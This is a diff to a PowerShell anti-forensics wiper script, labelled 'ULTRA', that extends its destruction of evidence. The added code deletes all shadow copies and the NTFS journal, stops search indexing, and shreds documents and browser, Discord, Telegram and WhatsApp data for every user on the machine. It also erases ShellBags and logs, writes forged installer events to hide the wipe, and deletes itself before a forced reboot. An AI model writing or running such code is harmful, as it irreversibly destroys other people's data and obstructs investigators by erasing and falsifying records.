@@ -5,7 +5,7 @@
 # ===============================================================
 
 $ErrorActionPreference = 'Continue'
-$version = "3.5-PRO"
+$version = "4.3-ULTRA"
 
 function Show-Header {
     Clear-Host
@@ -46,17 +46,24 @@ if (!(Test-Path $SDEL)) {
         Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/SDelete.zip' -OutFile $zip -UseBasicParsing
         Expand-Archive -Path $zip -DestinationPath $PSScriptRoot -Force
         Remove-Item $zip -Force
-    } catch {
+    }
+    catch {
         Write-Host "[!] Failed to download SDelete. Please ensure internet connection." -FG $R
         Write-Host "[!] Error: $_" -FG $R
     }
 }
+
 
 if (!(Test-Path $SDEL)) {
     Write-Host "[!] SDelete not found at $SDEL. Cannot proceed safely." -FG $R
     Read-Host "Press Enter to exit..."
     exit
 }
+
+# --- DEFENSE EVASION ---
+# Stop Windows Search to unlock index files
+Stop-Service "wsearch" -Force -ErrorAction SilentlyContinue
+
 
 & $SDEL -accepteula
 
@@ -127,13 +134,21 @@ function Force-Eradicate {
                 }
             }
         }
-    } catch {
+    }
+    catch {
         # Suppress all errors to keep the console clean as requested
     }
 }
 
+# --- MODULE 1.5: SHADOW COPY & JOURNAL PURGE ---
+Write-Host "[2/12] Annihilating Snapshots & Journals..." -FG $C
+vssadmin delete shadows /all /quiet 2>$null
+Write-Host "   [+] Volume Shadows: DESTROYED" -FG DarkGray
+fsutil usn deletejournal /d C: 2>$null
+Write-Host "   [+] NTFS Journal: OBLITERATED" -FG DarkGray
+
 # --- MODULE 2: STATE INCONSISTENCY (DEEP CLEAN) ---
-Write-Host "[2/12] Nuking Deep Artifacts (Shimcache/Amcache)..." -FG $C
+Write-Host "[3/12] Nuking Deep Artifacts (Shimcache/Amcache)..." -FG $C
 Write-Host "   [+] Shimcache: FLUSHED" -FG DarkGray
 Write-Host "   [+] Amcache: PURGED" -FG DarkGray
 
@@ -154,7 +169,7 @@ $targetDir = "$env:TEMP\void_fill"
 New-Item -ItemType Directory -Path $targetDir -Force -ErrorAction SilentlyContinue | Out-Null
 # Optimize: Reduce count, increase speed. 1000 files is enough to clutter MFT.
 $maxFiles = 1000
-for ($i=1; $i -le $maxFiles; $i++) {
+for ($i = 1; $i -le $maxFiles; $i++) {
     Write-Progress -Activity "MFT Burial In Progress" -Status "Overwriting MFT Record $i of $maxFiles" -PercentComplete (($i / $maxFiles) * 100)
     $null = New-Item -Path "$targetDir\ghost_$i.tmp" -ItemType File -Value "VOID" -Force
 }
@@ -163,66 +178,56 @@ Force-Eradicate $targetDir "Folder"
 
 # --- MODULE 4: PROCESS & DATA VAPORIZATION ---
 Write-Host "[4/12] Vaporizing Active Witnesses & Personal Stash..." -FG $C
-$procs = "chrome","msedge","brave","firefox","opera","Discord","WhatsApp","Telegram","explorer","msedgewebview2","edge","iexplore"
+$procs = "chrome", "msedge", "brave", "firefox", "opera", "Discord", "WhatsApp", "Telegram", "explorer", "msedgewebview2", "edge", "iexplore", "SearchApp", "SearchUI", "OneDrive"
 foreach ($p in $procs) {
     Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
 }
 Start-Sleep -Seconds 2
 
-# Helper function to get real paths from Registry (User Shell Folders)
-function Get-RealUserPath {
-    param($KeyName)
-    try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
-        $val = (Get-ItemProperty -Path $regPath -Name $KeyName -ErrorAction SilentlyContinue).$KeyName
-        if ($val) {
-            return [System.Environment]::ExpandEnvironmentVariables($val)
-        }
-    } catch {}
-    return $null
-}
+# --- SURGICAL USER WIPE (SAFE MODE) ---
+Write-Host "[!][CRITICAL] STARTING SURGICAL DATA WIPE (CONTENT ONLY)..." -FG $R
+Write-Host "   [i] Preserving Folder Structure for OS Stability" -FG DarkGray
 
-$folders = @(
-    (Get-RealUserPath "Personal"),          # Documents
-    (Get-RealUserPath "My Pictures"),       # Pictures
-    (Get-RealUserPath "My Video"),          # Videos
-    (Get-RealUserPath "Desktop"),           # Desktop
-    (Get-RealUserPath "{374DE290-123F-4565-9164-39C4925E467B}"), # Downloads GUID
-    (Get-RealUserPath "My Music")           # Music
-)
+$usersDir = "C:\Users"
+$targetUsers = Get-ChildItem -Path $usersDir -Directory -Force | Where-Object { $_.Name -notin @("Public", "Default", "All Users", "Default User") }
 
-# Filter out nulls and duplicates
-$folders = $folders | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique
-
-foreach ($f in $folders) {
-    if ($f -and (Test-Path $f)) {
-        # Safety: Don't wipe the entire UserProfile if path resolution fails or returns root
-        if ($f -eq $env:USERPROFILE -or $f -eq "C:\" -or $f -eq "C:\Users") { continue }
-        
-        Write-Host "[~] Shredding contents of: $f" -FG $Y
-        
-        # Only wipe contents, preserve the parent folder
-        $files = Get-ChildItem -Path $f -Force -Recurse -ErrorAction SilentlyContinue
-        $totalFiles = $files.Count
-        $counter = 0
-
-        if ($totalFiles -gt 0) {
-             foreach ($item in $files) {
-                $counter++
-                # Update progress bar every 10 items to reduce overhead
-                if ($counter % 10 -eq 0) {
-                    Write-Progress -Activity "Shredding Data in $f" -Status "Vaporizing: $($item.Name)" -PercentComplete (($counter / $totalFiles) * 100)
-                }
-
-                if ($item.PSIsContainer) {
-                    Force-Eradicate $item.FullName "Folder"
-                } else {
-                    Force-Eradicate $item.FullName "File"
-                }
+foreach ($user in $targetUsers) {
+    Write-Host "   [>>] ENTERING USER HIVES: $($user.Name)" -FG $Y
+    
+    # Target specific libraries where personal data lives
+    $subTargets = @(
+        "Desktop", "Downloads", "Documents", "Pictures", "Music", "Videos", "Saved Games", "Favorites", "Links", "OneDrive", 
+        "AppData\Local\Temp", 
+        "AppData\Roaming\Microsoft\Windows\Recent",
+        "AppData\Local\Google\Chrome\User Data",
+        "AppData\Local\Microsoft\Edge\User Data",
+        "AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        "AppData\Roaming\Mozilla\Firefox\Profiles",
+        "AppData\Roaming\Opera Software\Opera Stable",
+        "AppData\Roaming\Discord",
+        "AppData\Roaming\Telegram Desktop",
+        "AppData\Local\WhatsApp",
+        "AppData\Local\Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", 
+        "AppData\Local\Packages\5319275A.WhatsAppBeta_cv1g1gvanyjgm"
+    )
+    
+    foreach ($sub in $subTargets) {
+        $fullPath = Join-Path $user.FullName $sub
+        if (Test-Path $fullPath) {
+            Write-Host "      -> Sanitizing Content: $sub" -FG DarkGray
+             
+            # 1. Wipe Files inside (Keep Folder)
+            $files = Get-ChildItem -Path $fullPath -File -Recurse -Force -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                & $SDEL -p 1 -q $file.FullName 2>$null
             }
-            Write-Progress -Activity "Shredding Data in $f" -Completed
+             
+            # 2. Remove Sub-directories (Keep Root Target)
+            Get-ChildItem -Path $fullPath -Directory -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
+    
+    # DO NOT WIPE ROOT USER FILES (ntuser.dat etc) to prevent profile corruption before reset.
 }
 
 # --- MODULE 5: BROWSER, COMMS & SYSTEM ARTIFACTS ---
@@ -250,8 +255,7 @@ $appData = @(
     "$env:TEMP",
     "$env:WINDIR\Temp",
     "$env:WINDIR\Prefetch",
-    "$env:LocalAppData\Microsoft\Windows\WebCache",
-    "$env:LocalAppData\Microsoft\Windows\INetCache"
+    "$env:ProgramData\Microsoft\Search\Data"
 )
 
 # 1. Clear DNS Cache
@@ -279,7 +283,7 @@ foreach ($path in $appData) {
         # Special Hunter for Browsers: History, Cookies, Web Data
         $browserFiles = @("History", "Cookies", "Web Data", "Login Data", "Top Sites", "Visited Links")
         Get-ChildItem -Path $path -Include $browserFiles -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-             Force-Eradicate $_.FullName "File"
+            Force-Eradicate $_.FullName "File"
         }
 
         Force-Eradicate $path "Folder"
@@ -296,7 +300,7 @@ Write-Host "   [+] System Logs: VACUUMED" -FG DarkGray
 
 # Kedua, injeksi log palsu agar tidak terlihat 'kosong'
 $noiseCount = 20
-for ($i=1; $i -le $noiseCount; $i++) {
+for ($i = 1; $i -le $noiseCount; $i++) {
     Write-Progress -Activity "Injecting Noise" -Status "Fabricating Event $i of $noiseCount" -PercentComplete (($i / $noiseCount) * 100)
     Write-EventLog -LogName Application -Source "MsiInstaller" -EntryType Information -EventId 1033 -Message "Windows Installer reconfigured the product. Control Panel\Programs\Features. Transaction: $i."
 }
@@ -311,6 +315,14 @@ if (Test-Path "$env:AppData\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_
 }
 $rdpKeys = @("HKCU:\Software\Microsoft\Terminal Server Client\Servers", "HKCU:\Software\Microsoft\Terminal Server Client\Default")
 foreach ($k in $rdpKeys) { if (Test-Path $k) { Force-Eradicate $k "Registry" } }
+
+# ShellBags
+$bagPaths = @(
+    "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
+    "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags"
+)
+foreach ($b in $bagPaths) { if (Test-Path $b) { Force-Eradicate $b "Registry" } }
+Write-Host "   [+] ShellBags: INCINERATED" -FG DarkGray
 
 # --- MODULE 8: FREE SPACE SANITIZATION ---
 Write-Host "[8/12] Unleashing the Void: Free Space Sanitization..." -FG $C
@@ -339,11 +351,13 @@ if ($choice -eq '1') {
     $scriptPath = $PSCommandPath
     Start-Process cmd.exe -ArgumentList "/c timeout /t 3 && del `"$scriptPath`" && shutdown /r /t 0 /f" -WindowStyle Hidden
     exit
-} elseif ($choice -eq '2') {
+}
+elseif ($choice -eq '2') {
     $scriptPath = $PSCommandPath
     Start-Process cmd.exe -ArgumentList "/c timeout /t 3 && del `"$scriptPath`" && shutdown /s /t 0 /f" -WindowStyle Hidden
     exit
-} else {
+}
+else {
     Start-Process explorer.exe
     # Self-destruct via CMD to ensure clean removal after exit
     Start-Process cmd.exe -ArgumentList "/c timeout /t 3 && del `"$PSCommandPath`"" -WindowStyle Hidden
